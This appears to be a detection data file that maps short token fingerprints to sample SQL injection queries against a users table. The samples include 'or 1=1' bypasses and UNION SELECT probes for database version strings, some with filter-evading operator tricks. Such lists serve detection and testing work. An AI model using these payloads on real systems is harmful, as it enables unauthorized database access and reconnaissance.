"&()o1: select * from users where id=1 or (\)=1 union select 1,@@VERSION -- 1"
"&(.)o: select * from users where id=1 or (\.)=1 union select 1,@@VERSION -- 1"
&(1&1: select * from users where id=1 or (\+)=1 or 1=1 -- 1
"&(1)o: select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1"
"&(1UE: select * from users where id=1 or (\+)=1 union select 1,@@VERSION -- 1"
&(n&1: select * from users where id=1 or ($+)=1 or 1=1 -- 1
"&(nUE: select * from users where id=1 or ($+)=1 union select 1,@@VERSION -- 1"
&.o&1: select * from users where id=1 or \.<\ or 1=1 -- 1
&.o1&: select * from users where id=1 or \.<1 or 1=1 -- 1
"&.o1U: select * from users where id=1 or \.<1 union select 1,@@VERSION -- 1"
"&.oUE: select * from users where id=1 or \.<\ union select 1,@@VERSION -- 1"
&.on&: select * from users where id=1 or \.<$ or 1=1 -- 1
"&.onU: select * from users where id=1 or \.<$ union select 1,@@VERSION -- 1"
"&.oo1: select * from users where id=1 or \.< =1 union select 1,@@VERSION -- 1"
"&1UE1: select * from users where id=1 ||1 union select 1,banner from v$version where rownum=1 -- 1"
"&1UEv: select * from users where id=1 ||1 union select null,banner from v$version where rownum=1 -- 1"
&1c: select * from users where id=1   or 1=1 -- 1
&1oo&: select * from users where id=1 or \+<\ or 1=1 -- 1
"&1oo1: select * from users where id=1 or  1<@=1 union select 1,version() -- 1"
"&1ooU: select * from users where id=1 or \+<\ union select 1,@@VERSION -- 1"
"&1oon: select * from users where id=1 or \+<$ union select 1,@@VERSION -- 1"
"&1ovc: select * from users where id=1 or 1&@#=1 union select 1,version() -- 1"
"&n.o1: select * from users where id=1 or $ .=1 union select 1,@@VERSION -- 1"
&n1&1: select * from users where id=1 or $ 1=1 or 1=1 -- 1
"&n1UE: select * from users where id=1 or $ 1=1 union select 1,@@VERSION -- 1"
&no&1: select * from users where id=1 or $<\ or 1=1 -- 1
&no.&: select * from users where id=1 or $<\. or 1=1 -- 1
"&no.U: select * from users where id=1 or $<\. union select 1,@@VERSION -- 1"
"&noUE: select * from users where id=1 or $<\ union select 1,@@VERSION -- 1"
&noo&: select * from users where id=1 or $+<\ or 1=1 -- 1
"&noo1: select * from users where id=1 or $+<1 union select 1,@@VERSION -- 1"
"&nooU: select * from users where id=1 or $+<\ union select 1,@@VERSION -- 1"
"&noon: select * from users where id=1 or $+<$ union select 1,@@VERSION -- 1"
&o.&1: select * from users where id=1 or \<\. or 1=1 -- 1
"&o.UE: select * from users where id=1 or \<\. union select 1,@@VERSION -- 1"
&o1&1: select * from users where id=1 or \<1 or 1=1 -- 1
"&o1UE: select * from users where id=1 or \<1 union select 1,@@VERSION -- 1"
"&oUE1: select * from users where id=1 or \<\ union select 1,@@VERSION -- 1"
"&oUEv: select * from users where id=1 or \<\ union select null,@@VERSION -- 1"
&on&1: select * from users where id=1 or \<$ or 1=1 -- 1
"&onUE: select * from users where id=1 or \<$ union select 1,@@VERSION -- 1"
&oo1&: select * from users where id=1 or \< =1 or 1=1 -- 1
"&oo1U: select * from users where id=1 or \< =1 union select 1,@@VERSION -- 1"
&ov&1: select * from users where id=1 or !<@ or 1=1 -- 1
"&ovUE: select * from users where id=1 or !<@ union select 1,version() -- 1"
"&v: select * from users where id=1 or @`\` union select 1,version() -- 1"
"&vc: select * from users where id=1 or  @$#=1 union select 1,version() -- 1"
"&voo1: select * from users where id=1 or @<@=1 union select 1,version() -- 1"
)&1c: select * from users where id=1 +(\) or 1=1 -- 1
")UEvc: select * from users where id=1 +(\) union select null,@@VERSION -- 1"
".&1UE: select * from users where id=1.&&1 union select 1,version() -- 1"
.&1c: select * from users where id=1. or 1=1 -- 1
".&vUE: select * from users where id=1.&&@ union select 1,version() -- 1"
.)&1c: select * from users where id=1 + (\.) or 1=1 -- 1
".)UEv: select * from users where id=1 + (\.) union select null,@@VERSION -- 1"
".UE1,: select * from users where id=1.  union select 1,version() -- 1"
".UE1k: select * from users where id=1. union select 1,banner from v$version where rownum=1 -- 1"
".UEf(: select * from users where id=1.  union select version(),version() -- 1"
".UEv,: select * from users where id=1. union select null,version() -- 1"
".UEvc: select * from users where id=1 +\. union select null,@@VERSION -- 1"
".UEvk: select * from users where id=1. union select null,banner from v$version where rownum=1 -- 1"
.o&1c: select * from users where id=1. <@ or 1=1 -- 1
.o.&1: select * from users where id=1.<@. or 1=1 -- 1
".o.UE: select * from users where id=1.<@. union select 1,version() -- 1"
